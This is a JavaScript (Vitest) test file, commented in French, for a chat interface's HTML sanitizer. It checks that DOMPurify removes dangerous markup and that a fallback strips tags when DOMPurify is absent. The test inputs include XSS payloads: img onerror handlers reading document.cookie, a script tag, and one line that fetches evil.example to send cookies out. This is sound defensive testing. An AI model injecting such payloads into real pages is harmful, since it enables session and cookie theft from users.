// ── mathrender.js::sanitizeChatHtml/setRenderedHtmlContent — durcissement
// production : marked.parse() (chatbot.js) ne neutralise jamais le HTML brut
// présent dans son entrée, donc c'est setRenderedHtmlContent qui doit garantir
// qu'aucun script/attribut dangereux n'atteint jamais le DOM réel, tout en
// laissant passer le HTML "de mise en forme" produit par marked (voir audit
// production, "Rendu Markdown" priorité 3).
import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { sanitizeChatHtml, setRenderedHtmlContent } from "../mathrender.js";

describe("sanitizeChatHtml", () => {
  afterEach(() => {
    delete window.DOMPurify;
  });

  it("neutralise un <img onerror=...> via DOMPurify quand il est chargé", () => {
    // Simule le vrai DOMPurify (chargé via CDN en production, absent en
    // environnement de test) : on vérifie que sanitizeChatHtml délègue
    // réellement à window.DOMPurify.sanitize plutôt que de faire sa propre
    // neutralisation partielle.
    window.DOMPurify = {
      sanitize: (html) => html.replace(/<img[^>]*>/gi, ""),
    };
    const dangerous = '<p>Bonjour</p><img src=x onerror="alert(document.cookie)">';
    expect(sanitizeChatHtml(dangerous)).toBe("<p>Bonjour</p>");
  });

  it("conserve le HTML de mise en forme normal (marked) via DOMPurify", () => {
    window.DOMPurify = { sanitize: (html) => html };
    const safe = "<p>Une <strong>puissance</strong>, c'est $2^3$.</p>";
    expect(sanitizeChatHtml(safe)).toBe(safe);
  });

  it("repli sûr (retrait de toutes les balises) si DOMPurify n'est pas chargé", () => {
    delete window.DOMPurify;
    const dangerous = '<img src=x onerror="alert(1)">Bonjour';
    const result = sanitizeChatHtml(dangerous);
    expect(result).not.toContain("<img");
    expect(result).not.toContain("onerror");
    expect(result).toContain("Bonjour");
  });

  it("jamais fail-open : sans DOMPurify, un <script> est aussi retiré", () => {
    delete window.DOMPurify;
    const dangerous = "<script>alert(1)</script>Bonjour";
    const result = sanitizeChatHtml(dangerous);
    expect(result).not.toContain("<script");
    expect(result).toContain("Bonjour");
  });

  it("chaîne vide/nulle renvoie une chaîne vide", () => {
    expect(sanitizeChatHtml("")).toBe("");
    expect(sanitizeChatHtml(null)).toBe("");
    expect(sanitizeChatHtml(undefined)).toBe("");
  });
});

describe("setRenderedHtmlContent", () => {
  let el;

  beforeEach(() => {
    el = document.createElement("div");
  });

  afterEach(() => {
    delete window.DOMPurify;
    delete window.renderMathInElement;
  });

  it("injecte le HTML sanitisé dans l'élément (jamais le HTML brut non filtré)", () => {
    window.DOMPurify = { sanitize: (html) => html.replace(/<img[^>]*>/gi, "[image retirée]") };
    setRenderedHtmlContent(el, '<p>Salut</p><img src=x onerror="alert(1)">');
    expect(el.innerHTML).toBe("<p>Salut</p>[image retirée]");
  });

  it("un message malveillant réaliste (payload XSS classique) ne produit aucune balise <img>/<script> dans le DOM final", () => {
    // Sans DOMPurify chargé (cas dégradé) : preuve que même le repli fail-safe
    // empêche toute balise dangereuse d'atteindre le DOM réel.
    const payload = '<p>Regarde ça</p><img src=x onerror="fetch(\'https://evil.example/steal?c=\'+document.cookie)">';
    setRenderedHtmlContent(el, payload);
    expect(el.querySelector("img")).toBeNull();
    expect(el.querySelector("script")).toBeNull();
    expect(el.innerHTML).toContain("Regarde ça");
  });
});
